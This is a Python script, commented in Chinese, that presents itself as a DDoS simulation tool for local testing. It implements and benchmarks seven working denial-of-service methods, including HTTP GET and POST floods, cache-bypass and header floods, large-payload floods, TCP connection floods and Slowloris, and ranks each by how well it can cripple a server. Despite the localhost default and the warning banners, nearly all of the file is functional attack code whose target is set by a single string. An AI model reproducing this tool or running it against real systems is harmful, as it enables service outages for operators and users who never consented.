"""
進階 DDoS 模擬測試工具 - 多種攻擊方法比較
警告: 僅用於教育目的和本地測試
"""
import requests
import threading
import time
import socket
import random
import string
from urllib.parse import urlencode

class AdvancedDDoSSimulator:
    def __init__(self, target_url, target_host="127.0.0.1", target_port=8000):
        self.target_url = target_url
        self.target_host = target_host
        self.target_port = target_port
        self.request_count = 0
        self.error_count = 0
        self.lock = threading.Lock()
        self.running = True
        
    def increment_stats(self, success=True):
        """更新統計數據"""
        with self.lock:
            if success:
                self.request_count += 1
            else:
                self.error_count += 1
                
    def reset_stats(self):
        """重置統計數據"""
        with self.lock:
            self.request_count = 0
            self.error_count = 0
    
    # ==================== HTTP 層攻擊 ====================
    
    def http_get_flood(self):
        """HTTP GET 洪水攻擊 - 基本型"""
        while self.running:
            try:
                response = requests.get(self.target_url, timeout=2)
                self.increment_stats(True)
            except:
                self.increment_stats(False)
    
    def http_post_flood(self):
        """HTTP POST 洪水攻擊 - 帶大量數據"""
        while self.running:
            try:
                # 生成隨機數據
                data = {
                    'data': ''.join(random.choices(string.ascii_letters + string.digits, k=1000))
                }
                response = requests.post(self.target_url, data=data, timeout=2)
                self.increment_stats(True)
            except:
                self.increment_stats(False)
    
    def http_slowloris(self):
        """Slowloris 攻擊 - 慢速連接"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target_host, self.target_port))
            
            # 發送部分 HTTP 請求
            sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
            sock.send("User-Agent: {}\r\n".format(random.choice([
                "Mozilla/5.0", "Chrome/91.0", "Safari/14.0"
            ])).encode("utf-8"))
            
            # 保持連接並慢慢發送數據
            while self.running:
                try:
                    sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                    self.increment_stats(True)
                    time.sleep(15)  # 每15秒發送一次
                except:
                    break
        except:
            self.increment_stats(False)
    
    def http_cache_bypass(self):
        """繞過緩存攻擊 - 每次請求不同參數"""
        while self.running:
            try:
                # 隨機參數繞過緩存
                params = {
                    'rand': random.randint(1, 999999),
                    'cache': time.time()
                }
                response = requests.get(self.target_url, params=params, timeout=2)
                self.increment_stats(True)
            except:
                self.increment_stats(False)
    
    # ==================== TCP 層攻擊 ====================
    
    def tcp_syn_flood(self):
        """TCP SYN 洪水 (簡化版)"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_host, self.target_port))
                sock.close()
                self.increment_stats(True)
            except:
                self.increment_stats(False)
    
    def tcp_connection_flood(self):
        """TCP 連接洪水 - 大量建立連接"""
        sockets = []
        try:
            while self.running and len(sockets) < 100:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.target_host, self.target_port))
                    sockets.append(sock)
                    self.increment_stats(True)
                    time.sleep(0.01)
                except:
                    self.increment_stats(False)
                    break
        finally:
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
    
    # ==================== 應用層攻擊 ====================
    
    def http_header_flood(self):
        """HTTP Header 洪水 - 大量 Header"""
        while self.running:
            try:
                headers = {f'X-Custom-{i}': f'Value-{random.randint(1, 9999)}' 
                          for i in range(50)}
                response = requests.get(self.target_url, headers=headers, timeout=2)
                self.increment_stats(True)
            except:
                self.increment_stats(False)
    
    def http_large_payload(self):
        """HTTP 大封包攻擊"""
        while self.running:
            try:
                # 10KB 的隨機數據
                payload = ''.join(random.choices(string.ascii_letters, k=10240))
                response = requests.post(self.target_url, data={'data': payload}, timeout=2)
                self.increment_stats(True)
            except:
                self.increment_stats(False)
    
    # ==================== 攻擊執行引擎 ====================
    
    def run_attack(self, attack_method, num_threads, duration, attack_name):
        """執行指定的攻擊方法"""
        self.running = True
        self.reset_stats()
        
        print(f"\n{'='*70}")
        print(f"🎯 攻擊類型: {attack_name}")
        print(f"🔧 線程數: {num_threads}")
        print(f"⏱️  持續時間: {duration} 秒")
        print(f"{'='*70}")
        
        start_time = time.time()
        
        # 啟動攻擊線程
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=attack_method)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 監控攻擊進度
        try:
            for i in range(duration):
                time.sleep(1)
                with self.lock:
                    current_req = self.request_count
                    current_err = self.error_count
                if (i + 1) % 5 == 0:
                    print(f"[{i+1}s] 成功: {current_req} | 失敗: {current_err} | 速率: {current_req/(i+1):.1f} req/s")
        except KeyboardInterrupt:
            print("\n⚠️ 收到中斷信號")
        
        # 停止攻擊
        self.running = False
        time.sleep(2)
        
        end_time = time.time()
        elapsed = end_time - start_time
        
        # 統計結果
        with self.lock:
            total_req = self.request_count
            total_err = self.error_count
            total_attempts = total_req + total_err
            success_rate = (total_req / total_attempts * 100) if total_attempts > 0 else 0
        
        print(f"\n{'='*70}")
        print(f"📊 {attack_name} - 測試結果")
        print(f"{'='*70}")
        print(f"✅ 成功請求: {total_req}")
        print(f"❌ 失敗請求: {total_err}")
        print(f"📈 成功率: {success_rate:.2f}%")
        print(f"⚡ 平均速率: {total_req/elapsed:.2f} 請求/秒")
        print(f"⏱️  實際時長: {elapsed:.2f} 秒")
        print(f"💪 攻擊強度: {self._calculate_power(total_req, elapsed)}")
        print(f"{'='*70}\n")
        
        return {
            'name': attack_name,
            'threads': num_threads,
            'duration': elapsed,
            'success': total_req,
            'failed': total_err,
            'rate': total_req/elapsed,
            'success_rate': success_rate
        }
    
    def _calculate_power(self, requests, duration):
        """計算攻擊威力等級"""
        rate = requests / duration
        if rate > 500:
            return "🔥🔥🔥 極高 (可癱瘓小型伺服器)"
        elif rate > 200:
            return "🔥🔥 高 (嚴重影響效能)"
        elif rate > 100:
            return "🔥 中等 (明顯卡頓)"
        elif rate > 50:
            return "⚡ 低 (輕微影響)"
        else:
            return "💨 極低 (幾乎無影響)"

def run_comparison_test():
    """執行完整的攻擊方法比較測試"""
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║        進階 DDoS 測試工具 - 多種攻擊方法威力比較              ║
    ║                                                                  ║
    ║  ⚠️  警告: 僅用於本地測試和教育目的                            ║
    ║  ⚠️  未經授權攻擊他人伺服器是嚴重的違法行為                    ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    
    target_url = "http://127.0.0.1:8000"
    simulator = AdvancedDDoSSimulator(target_url)
    
    # 定義測試案例
    test_cases = [
        {
            'name': '1. HTTP GET 洪水 (基礎攻擊)',
            'method': simulator.http_get_flood,
            'threads': 50,
            'duration': 10
        },
        {
            'name': '2. HTTP POST 洪水 (帶數據)',
            'method': simulator.http_post_flood,
            'threads': 30,
            'duration': 10
        },
        {
            'name': '3. HTTP 繞過緩存 (隨機參數)',
            'method': simulator.http_cache_bypass,
            'threads': 50,
            'duration': 10
        },
        {
            'name': '4. HTTP Header 洪水 (大量Header)',
            'method': simulator.http_header_flood,
            'threads': 40,
            'duration': 10
        },
        {
            'name': '5. HTTP 大封包攻擊 (10KB)',
            'method': simulator.http_large_payload,
            'threads': 20,
            'duration': 10
        },
        {
            'name': '6. TCP SYN 洪水',
            'method': simulator.tcp_syn_flood,
            'threads': 100,
            'duration': 10
        },
        {
            'name': '7. Slowloris 慢速攻擊',
            'method': simulator.http_slowloris,
            'threads': 50,
            'duration': 15
        },
    ]
    
    print("📋 測試計畫:")
    for i, test in enumerate(test_cases, 1):
        print(f"  {i}. {test['name']}")
    
    print("\n" + "="*70)
    choice = input("選擇測試模式:\n  [1] 執行所有測試 (約2分鐘)\n  [2] 執行單一測試\n  [3] 自定義測試\n請選擇 (1/2/3): ")
    
    results = []
    
    if choice == '1':
        # 執行所有測試
        print("\n🚀 開始執行完整測試套件...\n")
        for test in test_cases:
            result = simulator.run_attack(
                test['method'],
                test['threads'],
                test['duration'],
                test['name']
            )
            results.append(result)
            time.sleep(3)  # 每次測試間隔3秒
        
        # 顯示比較結果
        print_comparison_results(results)
        
    elif choice == '2':
        # 單一測試
        print("\n選擇要測試的攻擊方法:")
        for i, test in enumerate(test_cases, 1):
            print(f"  [{i}] {test['name']}")
        
        try:
            selection = int(input("\n請輸入編號 (1-7): ")) - 1
            if 0 <= selection < len(test_cases):
                test = test_cases[selection]
                result = simulator.run_attack(
                    test['method'],
                    test['threads'],
                    test['duration'],
                    test['name']
                )
                results.append(result)
            else:
                print("無效的選擇!")
        except ValueError:
            print("無效的輸入!")
    
    elif choice == '3':
        # 自定義測試
        print("\n📝 自定義測試設定")
        print("選擇攻擊方法:")
        for i, test in enumerate(test_cases, 1):
            print(f"  [{i}] {test['name']}")
        
        try:
            selection = int(input("\n請輸入編號 (1-7): ")) - 1
            if 0 <= selection < len(test_cases):
                threads = int(input("線程數 (建議: 20-200): ") or "50")
                duration = int(input("持續時間(秒) (建議: 5-30): ") or "10")
                
                test = test_cases[selection]
                result = simulator.run_attack(
                    test['method'],
                    threads,
                    duration,
                    test['name']
                )
                results.append(result)
        except ValueError:
            print("無效的輸入!")

def print_comparison_results(results):
    """打印比較結果表格"""
    print("\n" + "="*100)
    print("📊 攻擊方法威力比較總結")
    print("="*100)
    print(f"{'排名':<5} {'攻擊方法':<35} {'線程':<8} {'成功請求':<12} {'速率(req/s)':<15} {'威力'}")
    print("-"*100)
    
    # 按速率排序
    sorted_results = sorted(results, key=lambda x: x['rate'], reverse=True)
    
    for i, result in enumerate(sorted_results, 1):
        power_icons = "🔥" * min(int(result['rate'] / 100) + 1, 5)
        print(f"{i:<5} {result['name']:<35} {result['threads']:<8} {result['success']:<12} {result['rate']:<15.1f} {power_icons}")
    
    print("="*100)
    print(f"\n🏆 最強攻擊: {sorted_results[0]['name']}")
    print(f"⚡ 最高速率: {sorted_results[0]['rate']:.1f} 請求/秒")
    print("\n💡 分析:")
    print("  - 純 GET/POST 請求速度最快,但容易被防禦")
    print("  - 大封包攻擊消耗更多伺服器資源")
    print("  - Slowloris 用較少連接達到長時間佔用")
    print("  - 實際攻擊通常會組合多種方法")
    print("="*100 + "\n")

if __name__ == '__main__':
    run_comparison_test()
